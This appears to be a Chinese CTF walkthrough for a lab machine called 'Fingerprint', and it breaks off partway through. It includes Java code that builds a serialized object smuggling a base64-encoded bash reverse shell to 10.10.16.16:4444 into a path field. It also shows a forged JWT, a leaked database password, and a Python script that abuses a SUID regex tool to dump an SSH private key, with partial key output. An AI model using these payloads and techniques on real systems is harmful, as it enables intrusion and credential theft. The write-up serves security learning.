<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src.utils;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.lang.ClassNotFoundException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerUtils</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toByteArray(<span class="hljs-keyword">final</span> Serializable obj) <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>                <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>                oos.writeObject(obj);<br>                oos.flush();<br>                <span class="hljs-keyword">return</span> bos.toByteArray();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">from</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>                <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data);<br>                <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>                <span class="hljs-keyword">return</span> ois.readObject();<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个项目一开始编译的时候遇到了很多问题，主要是<code>lombok</code>的配置问题，最后<code>pom.xml</code>文件如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">pluginManagement</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>11<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">annotationProcessorPaths</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">path</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">path</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">annotationProcessorPaths</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">pluginManagement</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h3><p>在解决各种依赖问题后，建立App.java作为主模块，编写逻辑如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src;<br><br><span class="hljs-keyword">import</span> com.admin.security.src.model.Profile;<br><span class="hljs-keyword">import</span> com.admin.security.src.model.User;<br><span class="hljs-keyword">import</span> com.admin.security.src.profile.UserProfileStorage;<br><span class="hljs-keyword">import</span> com.admin.security.src.utils.SerUtils;<br><span class="hljs-keyword">import</span> com.admin.security.src.utils.FileUtil;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">( String[] args )</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 首先生成profile的序列化文件，命名为test.ser</span><br>        <span class="hljs-type">Profile</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Profile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(), <span class="hljs-literal">true</span>);<br>        FileUtil.write(SerUtils.toByteArray(profile), <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./test.ser&quot;</span>));<br><br>        <span class="hljs-comment">// 然后生成user的序列化文件，文件名需要和上面的profile文件名向对应</span><br>        <span class="hljs-comment">// 使用了常规的反弹shell的payload，解码后为</span><br>        <span class="hljs-comment">// bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/10.10.16.16/4444 0&gt;&amp;1&#x27;</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">666</span>, <span class="hljs-string">&quot;../../../../$(echo \&quot;YmFzaCAtYyAnZXhlYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE2LzQ0NDQgMD4mMScK\&quot; | base64 -d | bash)/../../../data/uploads/test&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-comment">// 测试发现序列化UserProfileStorage对象或者User对象都能达到效果，目前原因未知。</span><br><span class="hljs-comment">//        UserProfileStorage ups = new UserProfileStorage(user);</span><br><span class="hljs-comment">//        System.out.println(Base64.getEncoder().encodeToString(SerUtils.toByteArray(ups)));</span><br>        System.out.println(Base64.getEncoder().encodeToString(SerUtils.toByteArray(user)));<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>将生成的数据填入user字段中，然后使用之前的<code>SECRET_KEY</code>生成校验段即可拿到伪造的JWT Token。</p>
<p><img src="/img/Fingerprint.assets/image-20220528203535288.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220528203535288"></p>
<p>记录如下：</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJ<span class="hljs-number">0</span>eXAiOiJKV<span class="hljs-number">1</span>QiLCJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiJ9</span>.eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VyIjoick<span class="hljs-number">8</span>wQUJYT<span class="hljs-symbol">nlBREZqYjIwdVlXUnRhVzR1</span>YzJWamRYS<span class="hljs-symbol">nBkSGt1</span>Yz<span class="hljs-symbol">NKakxuQnliMlpwYkdVdVZYTmxjbEJ5</span>YjJacGJHVlRkRzl<span class="hljs-number">5</span>WVdkbH<span class="hljs-symbol">NWZjRNY0</span>Fmb<span class="hljs-number">1</span>ZzQ<span class="hljs-number">0</span>FBRk<span class="hljs-number">1</span>BQVIxYzJWeWRBQWpUR<span class="hljs-number">052</span>Yl<span class="hljs-name">M5</span>aFpHMXBiaTl<span class="hljs-number">6</span>WldOMW<span class="hljs-symbol">NtbDBlUzl6</span>Y<span class="hljs-number">21</span><span class="hljs-symbol">NdmJXOWtaV3</span>d<span class="hljs-number">2</span>VlhObG<span class="hljs-symbol">NqdDRjSE55</span>QU<span class="hljs-symbol">NGamIyMHVZV1</span>J<span class="hljs-number">0</span>Y<span class="hljs-attr">Vc0</span>dWMyVmpkWEpwZEhrdWMzSmpMbTF<span class="hljs-number">2</span>WkdWc<span class="hljs-number">0</span>xsV<span class="hljs-symbol">npaWEtVQk5</span>kejQxKzVhd<span class="hljs-number">0</span>lBQkVrQUFtbGtUQUFMW<span class="hljs-name">m1</span>sdVoyV<span class="hljs-symbol">nljSEpwYm5</span>SMEFCSk<span class="hljs-number">1</span>hbUYyWV<span class="hljs-name">M5</span>c<span class="hljs-number">1</span>lX<span class="hljs-symbol">NW5</span>MMU<span class="hljs-number">4</span>wY<span class="hljs-number">21</span>sdVp<span class="hljs-number">6</span>dE<span class="hljs-number">1</span>BQWh<span class="hljs-number">3</span>WVhOemQyOXlaSEVBZmdBRVRBQUlkWE<span class="hljs-number">5</span>sY<span class="hljs-number">201</span>aGJXV<span class="hljs-symbol">nhBSDRBQkhod0</span>FBQU<span class="hljs-symbol">NtblFBQUhFQWZnQUdkQUNRTGk0</span>dkxp<span class="hljs-symbol">NHZMaTR2</span>TGk<span class="hljs-number">0</span>dkpDaGxZMmh<span class="hljs-number">2</span>SU<span class="hljs-symbol">NKWmJVWjZZVU5</span>CZEZs<span class="hljs-symbol">NVFXNWFXR2</span>hzV<span class="hljs-number">1</span>hsQ<span class="hljs-number">2</span>FWbFlUbTlKUXpGd<span class="hljs-number">1</span><span class="hljs-symbol">NVUTBiVWxET1</span>d<span class="hljs-number">0</span>YVdGbDJaRWRPZDB<span class="hljs-number">4</span><span class="hljs-symbol">NlJYZE1</span>ha<span class="hljs-number">1</span>YzVEdwRk<span class="hljs-number">1</span>reHFSVEp<span class="hljs-symbol">NZWxFd1</span>RrUlJaMDFFTkcxTlUyTkxJaUI<span class="hljs-number">4</span>SUdKaGMyVTJOQ<span class="hljs-number">0</span>F<span class="hljs-number">0</span>Wk<span class="hljs-symbol">NCOElHSmhjMmdwTHk0</span>dUx<span class="hljs-number">5</span><span class="hljs-symbol">NHVMeTR1</span>TDJSaGRHRXZkWEJzYjJGa<span class="hljs-number">2</span><span class="hljs-symbol">N5</span>OTBaWE<span class="hljs-number">4</span>wI<span class="hljs-symbol">n0</span><span class="hljs-number">.2</span>KOkhWYqILuF<span class="hljs-number">02</span>Lfquo_<span class="hljs-number">4</span>uHDzUGT<span class="hljs-number">5</span>d<span class="hljs-number">0</span>FXY<span class="hljs-number">5</span>H<span class="hljs-number">52</span>jMbpM<br></code></pre></td></tr></table></figure>

<p>将得到的Cookie替换后刷新界面，开启<code>nc</code>监听，即可拿到<code>www-data</code>的shell：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>whoami<br>www-data<br></code></pre></td></tr></table></figure>

<h1 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h1><p>拿到一个基本的shell后尝试提权，首先上传<code>linpeas</code>后能够在数据库中拿到一个密码：</p>
<p><img src="/img/Fingerprint.assets/image-20220528213140937.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220528213140937"></p>
<p><code>u_will_never_guess_this_password</code></p>
<p>然后在<code>home</code>目录下发现存在着<code>john</code>用户，下有<code>user.txt</code>，看起来我们是先要提权到<code>john</code>：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>ls /home<br>flask  john<br></code></pre></td></tr></table></figure>

<h2 id="cmatch"><a href="#cmatch" class="headerlink" title="cmatch"></a>cmatch</h2><p>翻了一下具有suid权限的二进制文件，发现有一个<code>cmatch</code>文件。</p>
<p><img src="/img/Fingerprint.assets/image-20220528213513611.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220528213513611"></p>
<p>使用file命令查看文件，发现是一个用go编写的可执行文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">➤  file cmatch <br>cmatch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=g0S7smUZ4Ljbm3adlw4M/rerwBcGwNE-PzKhA00uD/bFZyY2tGMN1Pij5MJT3S/a3vHbLilzEj9Jm1HX5K5, not stripped<br></code></pre></td></tr></table></figure>

<h3 id="功能推断"><a href="#功能推断" class="headerlink" title="功能推断"></a>功能推断</h3><p>在不断尝试的过程中，我们可以发现它实现了一个文件匹配的功能。</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch a<br><span class="hljs-title class_">Incorrect</span> number of arguments!<br>www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch a<br><span class="hljs-title class_">Incorrect</span> number of arguments!<br>www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch a a<br>open <span class="hljs-symbol">a:</span> no such file <span class="hljs-keyword">or</span> directory<br>www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch /etc/passwd a<br><span class="hljs-title class_">Found</span> <span class="hljs-symbol">matches:</span> <span class="hljs-number">105</span><br>www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch /etc/passwd john<br><span class="hljs-title class_">Found</span> <span class="hljs-symbol">matches:</span> <span class="hljs-number">3</span><br>www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>grep john /etc/passwd<br><span class="hljs-symbol">john:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:john</span><span class="hljs-symbol">:/home/john</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></td></tr></table></figure>

<p>然后同时还发现这个脚本支持正则匹配：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch /etc/passwd .<br><span class="hljs-title class_">Found</span> <span class="hljs-symbol">matches:</span> <span class="hljs-number">1610</span><br></code></pre></td></tr></table></figure>

<p>然后看看能不能读john的私钥文件：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch /home/john/.ssh/id_rsa .<br><span class="hljs-title class_">Found</span> <span class="hljs-symbol">matches:</span> <span class="hljs-number">1736</span><br></code></pre></td></tr></table></figure>

<h3 id="exploit编写"><a href="#exploit编写" class="headerlink" title="exploit编写"></a>exploit编写</h3><p>是可以的，所以理论上我们可以通过这个脚本一步一步将<code>john</code>用户的ssh私钥读出来，编写脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> string<br><br>special_chars = <span class="hljs-string">&quot;:,-=/+ &quot;</span><br>known_chars = string.ascii_letters + string.digits + <span class="hljs-string">&quot;\n&quot;</span> + special_chars<br>key = <span class="hljs-string">&quot;^-----BEGIN&quot;</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----BEGIN&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> known_chars:<br>            c_reg = c<br>            <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> special_chars:<br>                <span class="hljs-keyword">if</span> c == <span class="hljs-string">&quot; &quot;</span>:<br>                    c_reg = <span class="hljs-string">&quot;\\s&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    c_reg = <span class="hljs-string">&quot;\\&quot;</span> + c<br>            <span class="hljs-comment"># 运行命令</span><br>            reg = <span class="hljs-string">f&#x27;/usr/bin/cmatch /home/john/.ssh/id_rsa &quot;<span class="hljs-subst">&#123;key&#125;</span><span class="hljs-subst">&#123;c&#125;</span>&quot;&#x27;</span><br>            <span class="hljs-comment"># 检查输出结果</span><br>            res = subprocess.check_output(<span class="hljs-string">f&#x27;/usr/bin/cmatch /home/john/.ssh/id_rsa &quot;<span class="hljs-subst">&#123;key&#125;</span><span class="hljs-subst">&#123;c_reg&#125;</span>&quot;&#x27;</span>, shell=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">if</span> res == <span class="hljs-string">b&quot;Found matches: 1\n&quot;</span>:<br>                <span class="hljs-comment"># 拼接</span><br>                key = key + c_reg<br>                <span class="hljs-built_in">print</span>(c, end=<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>

<p>这里建议是先将cmatch这个文件拖下来在本地进行测试和代码测试，这样会快一些。</p>
<p>测试通过后将文件上传到靶机上然后运行，结果如下：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs awk">www-data@fingerprint:<span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/glassfish/</span>domains<span class="hljs-regexp">/domain1/</span>config$ python test.py<br>-----<span class="hljs-keyword">BEGIN</span> RSA PRIVATE KEY-----<br>Proc-Type: <span class="hljs-number">4</span>,ENCRYPTED<br>DEK-Info: AES-<span class="hljs-number">128</span>-CBC,C310F9D86AE7CB5EA10046F9A215F423<br><br>ysiTr753RYpx1qkFJRvge/Dtu7rMEocAuCchOzAUgw9MqyPuI5M9m6KTvdB2E+SC<br>KI8IlmSbAAu0obdwTOuKD0QDGCMlXadI91WKkhALiLuw0JsxuviTqkjy/xQOJYu+<br>T4VCRI8vZoc5lfGRXnVsOJmrfTWc8f43YSD+j8dOFvdkHi0ud7xSQfqKyhDVsRyO<br><span class="hljs-number">6</span>qM2v5RnBJBktl7vwftG5vyk5vZjmx2u5BXTksuBrMUF2iZVtsoQ59L70CtIXP0M<br>g5HV4QZWRhSlS++i8W0GnWzCGANwiS18Z6CR4noSw80huaCIqWfwnoTXGJx91IDM<br>S79dBUPaK109+DKXZfT600JriZ8S9yvox3QuQ9KwsqTP<span class="hljs-regexp">/Iz8NqQI/</span>J5KLoivM+t4<br>DHjReKktYJQ+jLB1hA3CQDYs/kVUHdG2ThluFESVrnhJDvkyvKLxNlixighsb2+c<br><span class="hljs-number">3</span>JHnD8OvXOxrj2jl0k<span 